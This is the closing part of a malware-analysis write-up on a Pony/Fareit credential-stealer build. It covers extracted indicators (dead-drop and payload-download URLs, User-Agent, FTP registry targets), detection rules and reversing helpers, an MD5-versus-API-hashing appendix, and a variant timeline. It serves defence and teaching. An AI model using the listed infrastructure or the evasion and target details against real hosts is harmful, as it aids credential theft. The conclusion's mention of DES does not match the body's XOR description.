  Obfuscation: push/pop/push-clc-jb-ret indirect call
  Resolves to: 0x410335
  Anti-emulation gate: GetTickCount mod-N gate
    loop until (GetTickCount() mod 7) == 5

--- Dead-drop URLs (config / payload list) ---
  http://o.casasferiasacores.org/forum/viewtopic.php
  http://o.cutanddrop.com/forum/viewtopic.php

--- Payload download URLs ---
  http://034c695.netsolhost.com/a1oep.exe
  http://cauplastic.com/V38T2Yx.exe
  [... 9 more ...]

--- HTTP fingerprint ---
  User-Agent : Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)
  Ack token  : STATUS-IMPORT-OK

--- FTP client registry targets ---
  Software\BPFTP
  Software\FileZilla
  [... 41 more ...]
```

Use `-j` / `--json` to get a machine-readable dump suitable for feeding into a SIEM, a hunting pipeline, or a continuous-triage workflow. The script performs no emulation, makes no network requests, and does not execute the sample; it is a pure static pass over the PE bytes, safe to run inside any analyst workstation without sandboxing.

### YARA detection rules

Two paired rules: `Pony_Stealer_Credential_Harvester` (a multi-clause matcher that fires on the combination of credential-theft tells even when the operator mutates one or two of them) and `Pony_Stealer_HTTP_Protocol` (a narrow network-fingerprint rule that fires on the HTTP POST template and the `STATUS-IMPORT-OK` ack token together). Both validated green against the sample in this post.

### IDAPython helper scripts

Two scripts for the reverse-engineering side:

- **`ida_pony_setup.py`** — parses minimal TEB / PEB / sockaddr_in / hostent types into the active TIL, renames the six key functions we reference throughout this write-up (`pony_entry_trampoline`, `pony_anti_emulation_gate`, `md5_transform`, `aplib_init_with_integrity`, `pony_tcp_connect`, `peb_being_debugged_check_inline`), applies Hex-Rays prototypes, prototypes WSock32 imports, attaches explanatory comments on every anti-analysis stub, and tags the `FS:[0x30]` displacement as `TEB_MIN.ProcessEnvironmentBlock`.
- **`ida_pony_md5_pretty.py`** — the MD5-specific follow-up that defines a `MD5_STATE` struct, installs an `MD5_T_CONST` enum with all 64 RFC 1321 T-table constants, and renames the 67 SSA temporaries in `md5_transform` using the standard `a / d / c / b` rotation convention so the decompiled output reads like a textbook MD5 implementation rather than a sea of `v9`, `v10`, `v11`.

Both scripts are idempotent and work on IDA 7.7 through 9.x.

Links to all artefacts appear at the bottom of this post.

---

## Appendix: Is That MD5 or API Hashing?

A reasonable first reaction when an analyst sees a ~1.5 KB function full of rotate-shift-xor-add-constant operations in a piece of malware is to assume it is API hashing — the standard technique where shellcode and C2 stubs resolve imports by a 32-bit hash of the function name instead of the name itself, to hide their intent from static analysis. The `md5_transform` function in this binary is not that. It is plain RFC 1321 MD5, and the distinction matters because it tells you what the crypto is *for*.

Four signatures settle the identification:

**1. The 64 additive constants are the MD5 T-table.** MD5 uses T[i] = floor(2^32 × |sin(i)|) for i = 1..64. The Hex-Rays pseudocode shows them as signed literals (`-0x28955B88`, `-0x173848AA`, `606105819`, `-1044525330`, ...), but reinterpreted as unsigned 32-bit values they are `0xD76AA478`, `0xE8C7B756`, `0x242070DB`, `0xC1BDCEEE` — the first four entries in any reference MD5 implementation. All 64 match.

**2. The four round functions are F, G, H, I.** The bitwise expressions track RFC 1321 verbatim:

| Round | Form in pseudocode | MD5 function |
|---|---|---|
| 1 | `(d ^ b & (d ^ c))` | F(b,c,d) = (b ∧ c) ∨ (¬b ∧ d), rewritten |
| 2 | `(c ^ a & (c ^ b))` | G(b,c,d) = (b ∧ d) ∨ (c ∧ ¬d), rewritten |
| 3 | `(a ^ b ^ c)`       | H(b,c,d) = b ⊕ c ⊕ d |
| 4 | `(c ^ (b \| ~d))`   | I(b,c,d) = c ⊕ (b ∨ ¬d) |

**3. The shift schedule is the MD5 shift schedule.** The third argument to `__ROL4__` cycles through `{7,12,17,22}` in round 1, `{5,9,14,20}` in round 2, `{4,11,16,23}` in round 3, and `{6,10,15,21}` in round 4 — exactly as specified in RFC 1321.

**4. The block size and state update are MD5's.** `blocks += 64` per iteration (512-bit Merkle–Damgård block) and the four final adds `state[0] += ...; state[1] += ...; state[2] += ...; state[3] += ...` update a 128-bit chaining value. The initial state (`0x67452301`, `0xEFCDAB89`, `0x98BADCFE`, `0x10325476`) lives as a literal at `0x00402D01`, immediately before the function.

API hashing, by contrast, would look nothing like this. A typical Metasploit or Cobalt Strike style resolver is 10–30 instructions long, consumes an ASCII string byte-by-byte, produces a single 32-bit output, and is called with a fixed hash constant like `0x7C0017A5` whose input string has to be recovered separately. The hallmark is a tight loop with `ror eax, 13` or `crc32 eax, al` and no round constants. If you ever see *sixty-four* distinct additive constants and a round-function rotation, you are looking at a real cryptographic hash (MD5, SHA-1, or SHA-2), not an import resolver.

### What Pony uses the MD5 for

Three places in this build:

- **Session XOR-key derivation.** The `CoCreateGuid` output is MD5-hashed to produce the 16-byte rolling-XOR key applied to the credential blob before POST. The server re-derives the key from the `Client Hash` field, which is why that field is mandatory in every submission.
- **HWID stabilization.** The raw GUID bytes are mixed through MD5 before being formatted as the {% raw %}`{%08X-%04X-...}`{% endraw %} display string, giving the panel a deterministic per-host identifier even though `CoCreateGuid` produces fresh random values each run.
- **Payload-envelope checksum.** The final 16 bytes of the POST body are the MD5 of the preceding plaintext, so the server can reject truncated or bit-flipped submissions without attempting decryption first.

None of these are API hashing. All three are standard applications of a cryptographic hash function: key derivation, fingerprinting, integrity.

## Where This Build Fits on the Pony Timeline

Pony has a long and well-documented history. Its 2.0 source code leaked in 2015 and has since been forked, renamed, repackaged, and embedded in other loaders repeatedly. The family is extensively catalogued on Malpedia under `win.pony` with aliases `Fareit` and `Siplog`, and mapped in MITRE ATT&CK as `S0453`. Cross-referencing the sample analyzed here against the public analyses reveals which era it belongs to:

| Feature | This sample | Leaked Pony 2.0 source | Guillaume Orlando's 2017 variant | RexorVc0's 2024 variant |
|---|---|---|---|---|
| Delivery | Single-stage PE32 | Single-stage PE32 | .NET Reactor staged loader | Multi-stage with DeepSea 4.1 |
| Final payload injection | None — runs in-proc | None | Process hollowing into `RegAsm.exe` | Process hollowing into `vbc.exe` / `MSBuild.exe` |
| Anti-VM | None | None | WMI video-controller queries | WMI + Sandboxie process check |
| `GetTickCount` timing gate | `mod 7 == 5` | `mod 10 == 5` | Not documented | Not documented |
| User-Agent | `MSIE 5.0; Windows 98` | `MSIE 5.0; Windows 98` | `MSIE 8.0; Windows NT 5.1; Trident/5.0` | Newer strings |
| HWID source | WinRAR → CoCreateGuid | WinRAR → CoCreateGuid | WinRAR → CoCreateGuid | Same |
| FTP client count | 43 registry + many INI | ~62 | 62 | Expanded |
| Crypto identification | MD5 + XOR (+ APLib) | MD5 + XOR | Same | Same |
| Rogue-byte anti-disassembly | `push/pop/push-clc-jb-ret` | Same idiom, `0xFE` variant also present | Documented as "rogue-byte" | Documented |

Reading the table left to right is effectively a timeline. Our sample sits closest to the leaked 2.0 source and pre-dates the major additions that showed up in later builds: the anti-VM WMI queries, the .NET-assisted multi-stage loader, and the injection into `RegAsm.exe` that Guillaume Orlando and RexorVc0 both describe on more recent variants. The User-Agent is a tell: Pony builds with `MSIE 5.0; Windows 98` are older — operators moved to plausible modern agents like the IE8/Trident/5.0 string once enterprise proxies started flagging the 1998-era header.

The single notable departure from the leaked source code is the `mod 7 == 5` timing gate. The public Pony 2.0 source uses `mod 10 == 5`. Changing this single byte (`b9 07 00 00 00` vs `b9 0a 00 00 00` — `MOV ECX, 7` vs `MOV ECX, 10`) is the kind of trivial per-build-unique mutation an operator would apply to dodge generic signatures that match the leaked source verbatim. It also happens to shorten the average loop iteration count, so a real machine clears the gate slightly faster than the stock build would.

## Prior Art and Further Reading

Pony is not a novel family and this write-up does not claim otherwise. The public technical literature is extensive; the analysis above relies on it and attempts to add clarity and automation rather than new discovery. The most useful references for an analyst encountering a Pony build for the first time:

- **[Malpedia: win.pony](https://malpedia.caad.fkie.fraunhofer.de/details/win.pony)** — canonical family entry, aliases, YARA rule, reference bibliography.
- **[MITRE ATT&CK S0453](https://attack.mitre.org/software/S0453/)** — technique mapping.
- **[Guillaume Orlando — Malware Analysis: Pony](https://guillaumeorlando.github.io/Pony-malware-analysis)** — the most detailed open reverse-engineering walk-through, covers rogue-byte anti-disassembly, WMI anti-VM, process hollowing into `RegAsm.exe`, and the 62-FTP-client credential matrix.
- **[Infosec Institute — Reversing the Pony Trojan, Part I](https://resources.infosecinstitute.com/topic/reversing-the-pony-trojan-part-i/)** and **[Part II](https://www.infosecinstitute.com/resources/malware-analysis/reversing-the-pony-trojan-part-ii/)** — classic two-part teardown.
- **[XyliBox — Pony 1.9 (Win32/Fareit)](https://www.xylibox.com/2013/05/pony-19-win32fareit.html)** — 2013 analysis of the control-panel side, which is where the `STATUS-IMPORT-OK` ack string originates.
- **[CyberArk — A Pony Hidden in Your Secret Garden](https://www.cyberark.com/resources/threat-research-blog/a-pony-hidden-in-your-secret-garden)** — variant survey.
- **[RexorVc0 — Pony | Fareit (2024)](https://rexorvc0.com/2024/02/04/Pony_Fareit/)** — recent multi-stage variant analysis.
- **[Malwarebytes Labs — No money, but Pony! (2015)](https://www.malwarebytes.com/blog/news/2015/11/no-money-but-pony-from-a-mail-to-a-trojan-horse)** — distribution via email attachments.
- **[Netskope — Pony Loader Exfiltrates User Wallet Data](https://www.netskope.com/blog/pony-loader-exfiltrates-user-wallet-data)** — cryptocurrency-wallet theft angle (absent from our 2012-era sample).
- **[HHS — Pony/Fareit Malware Threat Profile (PDF)](https://www.hhs.gov/sites/default/files/pony-fareit-malware.pdf)** — U.S. government overview.
- **[ANY.RUN — Pony Malware Trends](https://any.run/malware-trends/pony/)** — sandbox-run corpus and trending telemetry.
- **Pony 2.0 leaked source** — referenced for algorithm cross-check only; direct links are discouraged because the repository remains live in several mirrors. Malpedia and Trustwave have redistributed the relevant snippets with attribution.

### What this analysis adds

Given the weight of prior art, it is worth being explicit about what, if anything, is incremental here:

- The **`mod 7 == 5` timing gate constant** differs from the `mod 10 == 5` constant in the leaked source, and the difference is small enough to be a single per-build mutation. Worth flagging because the gate is precisely what defeats default-configured sandboxes.
- A **concrete Speakeasy trace** showing 9,980 `GetTickCount` calls in 6.052 seconds of emulator time with zero observable behavior — evidence for the "why cheap sandboxes miss this" claim.
- An **MSDN-style walk-through of the PEB.BeingDebugged check** decoded byte-by-byte, suitable for use as a teaching reference rather than an assumed-known step.
- An **MD5-vs-API-hashing identification appendix**, addressing the reasonable first impression that a ~1.5 KB rotate-xor-add function must be an import resolver.
- A **character analysis of the 256-entry brute-force dictionary**, including the Russian-keyboard-layout tells (`ghbdtn`, `gfhjkm`) that point at the corpus origin.
- A **Python config extractor** that pulls URLs, FTP/email/browser targets, HWID format, and the anti-emulation gate parameters out of any Pony build of this era in one pass.
- An **IDAPython setup script** that applies structures, prototypes, and comments for a clean Hex-Rays view of the six functions referenced throughout the write-up.

The goal is not to be the first to document Pony; it is to be the analysis a triage engineer can hand to a junior without also having to hand them a reading list.

## Downloads

All artefacts referenced above are published under a permissive license for reuse in triage, teaching, and detection engineering. No malware binaries or live C2 samples are redistributed.

- **Analysis bundle:** [analysis_data/pony_apr_2026](https://github.com/taogoldi/analysis_data/tree/main/pony_apr_2026) — scripts, reports, IDAPython helpers, and the structured JSON extraction.
- **Extractor script:** [`pony_config_extractor.py`](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/scripts/pony_config_extractor.py) — one-shot static config extractor (Python 3, `pefile` only).
- **IDAPython scripts:** [`ida_pony_setup.py`](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/scripts/ida_pony_setup.py) (struct/type/name setup) and [`ida_pony_md5_pretty.py`](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/scripts/ida_pony_md5_pretty.py) (MD5-specific beautifier).
- **YARA rules:** [stealers/pony/pony.yar](https://github.com/taogoldi/YARA/blob/main/stealers/pony/pony.yar) — two paired rules covering the credential-theft tell-set and the HTTP network fingerprint.
- **Structured report:** [pony_stealer_analysis_report.json](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/reports/pony_stealer_analysis_report.json) and [pony_extracted_config.json](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/reports/pony_extracted_config.json).
- **Screenshot capture guide:** [README_screenshots.md](https://github.com/taogoldi/analysis_data/blob/main/pony_apr_2026/scripts/README_screenshots.md) — if you want to regenerate the figures in this post from your own IDA session.

---

## Conclusion

This Pony sample is not sophisticated by 2026 standards. It uses no process injection, no kernel exploits, no EDR bypass. What it demonstrates instead is the enduring return on investment of broad-coverage credential theft: a single 92 KB binary that, when executed on any Windows host with a few FTP clients and a browser, silently drains the credential stores of over sixty distinct applications, packages the results under a thin DES wrapper, and uploads them to a remote panel before removing itself.

The infrastructure -- compromised phpBB forums as dead drops, eleven hijacked hosting accounts as payload servers -- reflects a low-budget, high-volume operational model that remained viable across most of the 2010s. Detection is straightforward for any organization that deploys HTTP inspection: the User-Agent string alone is sufficient to block exfiltration, and the YARA rules above will match the binary at rest without execution.

The lesson Pony teaches is not about technical novelty. It is about coverage. A credential stealer that targets sixty applications does not need to be clever. It just needs to be thorough.
